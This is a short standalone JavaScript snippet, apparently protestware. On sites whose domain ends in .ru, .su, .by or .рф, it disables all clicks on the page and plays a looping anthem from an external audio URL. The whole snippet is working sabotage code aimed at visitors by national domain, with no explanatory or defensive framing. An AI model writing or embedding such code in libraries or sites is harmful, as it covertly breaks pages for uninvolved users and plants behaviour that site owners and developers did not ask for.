if (navigator.language && location.host.match(/\.(ru|su|by|xn--p1ai)$/)) {
 document.body.style.pointerEvents="none";
 const sound=document.createElement("audio");
 sound.src="https://media.example/anthem.mp3";
 sound.loop=true; document.body.appendChild(sound); sound.play();
}
